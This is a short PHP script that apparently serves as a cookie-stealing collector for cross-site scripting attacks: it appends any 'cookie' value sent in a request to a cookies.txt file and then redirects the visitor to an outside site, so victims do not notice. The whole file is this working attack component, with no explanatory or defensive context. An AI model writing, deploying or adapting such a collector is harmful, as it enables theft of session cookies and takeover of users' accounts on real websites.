<?php

if (isset($_REQUEST["cookie"])) {
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, $_REQUEST["cookie"] . "\n");
  fclose($fp);
}

header("Location: http://kerberosclan.puppies.chatzi.org");
